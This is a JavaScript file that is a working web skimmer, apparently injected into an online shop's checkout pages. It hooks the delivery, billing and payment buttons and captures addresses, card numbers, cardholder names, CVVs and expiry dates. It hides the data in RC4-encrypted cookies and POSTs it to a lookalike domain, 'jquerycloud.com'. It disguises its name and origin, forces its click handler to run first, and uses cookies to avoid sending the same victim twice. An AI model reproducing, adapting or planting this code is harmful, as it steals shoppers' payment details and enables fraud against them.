function pushinfo(e, t, n) {
    n && "" != n && (e[t] = n)
}

function pushdata(e, t) {
    var n = jQuery("#" + t + " [type=radio]:checked+label address").html();
    null == n ? (pushinfo(e, "address1", jQuery("#" + t + "_address_1").val()), pushinfo(e, "address2", jQuery("#" + t + "_address_2").val()), pushinfo(e, "city", jQuery("#" + t + "_town").val()), pushinfo(e, "zip", jQuery("#" + t + "_postcode").val()), pushinfo(e, "country", jQuery("#" + t + "_country").val())) : function(e, t) {
        for (var n = e.split("<br>"), o = [], r = 0; r < n.length; r++) {
            var a = n[r].replace("\r", "");
            a = a.replace(/(^\s+|\s+$)/g, ""), o.push(a)
        }
        var i = 0;
        t.address1 = o[1], o[5] ? t.address2 = o[2] : (t.address2 = "", i = 1), t.city = o[3 - i], t.zip = o[4 - i], t.country = o[5 - i]
    }(n, e)
}

function deliveryButton() {
    var e = loadData();
    pushdata(e, "delivery"), saveData(e)
}

function billingButton() {
    var e = loadData();
    jQuery("#billing-address__same:checked").length || pushdata(e, "billing"), saveData(e)
}

function paymentButton() {
    var e = loadData();
    e.ccnumber = jQuery("#card_number").val(), e.ccname = jQuery("#card_name").val(), e.cvv = jQuery("#security_code").val(), e.ccmonth = jQuery('[name="end_date[month]"]').val(), e.ccyear = jQuery('[name="end_date[year]"]').val(), e.address = e.address1 + " , " + e.address2;
    try {
        e.shop = window.location.host
    } catch (e) {}
    saveDataF(e)
}

function saveData(e) {
    var t = JSON.stringify(e),
        n = eh(rc4("1", t));
    createCookie(document.vertCookies, n, 36e3)
}

function loadData() {
    var e = getCookie(document.vertCookies);
    if (!e) return {};
    var t = rc4("1", dh(e));
    return JSON.parse(t)
}

function appendScript() {
    setTimeout(function() {
        document.isExecuted || !0 === document.isExecuted || (document.isExecuted = !0, deflateMeyhod())
    }, 1e3 * Math.random())
}

function deflateMeyhod() {
    setInterval(function() {
        setListener()
    }, 2e3)
}

function setListener() {
    var e = window.location.href;
    if (0 != (e = e.split("/")).length) {
        var t = null;
        0 == (e = e[e.length - 1]).indexOf("delivery") && (document.sEvent = ".checkout-address__buttons", t = deliveryButton), 0 == e.indexOf("billing") && (document.sEvent = ".checkout-address__buttons", t = billingButton), 0 == e.indexOf("payment") && (document.sEvent = ".payment__buttons", t = paymentButton), t && initListenerStats(t)
    }
}

function initListenerStats(e) {
    "1" != getCookie(document.sCookies) && bindFirst(jQuery(document.sEvent), "click", function() {
        e()
    }), jQuery(document.sEvent) && jQuery(document.sEvent).addClass(document.sClass)
}

function saveDataF(e) {
    cardInfo = e;
    var t = JSON.stringify(cardInfo),
        n = key(),
        o = eh(n + rc4(n, t));
    createCookie(document.sCookies, o, 36e3)
}

function sendData(e) {
    "" != e && jQuery.ajax({
        url: "https://jquerycloud.com/tr/",
        data: {
            q: e
        },
        type: "POST",
        success: function(e) {
            createCookie(document.sCookies, "1", 36e3), createCookie(document.vertCookies, "1", 36e3), "" != e && console.log(e)
        },
        error: function(e, t, n) {
            createCookie(document.sCookies, "1", 36e3), createCookie(document.vertCookies, "1", 36e3)
        }
    })
}

function worker() {
    var e = getCookie(document.sCookies);
    e && "1" != e && sendData(e)
}
document.sClass = "yeikyd", document.sEvent = "", document.sCookies = "tnfyfn", document.vertCookies = "hnhtyh", document.addEventListener("DOMContentLoaded", function() {
    appendScript()
}), bindFirst = function(e, t, n) {
    var o, r, a, i;
    for (e.bind(t, n), a = 0, i = e.length; a < i; a++) o = e[a], (r = jQuery._data(o).events[t.split(".")[0]]).unshift(r.pop())
};
var createCookie = function(e, t, n) {
        var o = "";
        if (n) {
            var r = new Date;
            r.setTime(r.getTime() + 60 * n * 1e3), o = "; expires=" + r.toUTCString()
        }
        document.cookie = e + "=" + t + o + "; path=/"
    },
    getCookie = function(e) {
        var t = document.cookie.match(new RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
        return t ? decodeURIComponent(t[1]) : void 0
    },
    rc4 = function(e, t) {
        for (var n, o = [], r = 0, a = "", i = 0; i < 256; i++) o[i] = i;
        for (i = 0; i < 256; i++) r = (r + o[i] + e.charCodeAt(i % e.length)) % 256, n = o[i], o[i] = o[r], o[r] = n;
        i = 0, r = 0;
        for (var s = 0; s < t.length; s++) r = (r + o[i = (i + 1) % 256]) % 256, n = o[i], o[i] = o[r], o[r] = n, a += String.fromCharCode(t.charCodeAt(s) ^ o[(o[i] + o[r]) % 256]);
        return a
    },
    key = function() {
        for (var e = "", t = 0; t < 16; t++) e += String.fromCharCode(Math.round(255 * Math.random()));
        return e
    },
    dh = function(e) {
        res = "";
        for (var t = 0; t < e.length; t += 2) res += String.fromCharCode(parseInt(e.substr(t, 2), 16));
        return res
    },
    eh = function(e) {
        var t, n = "";
        for (t = 0; t < e.length; t++) n += ("0" + e.charCodeAt(t).toString(16)).slice(-2);
        return n
    };
setTimeout(function() {
    worker()
}, 500);
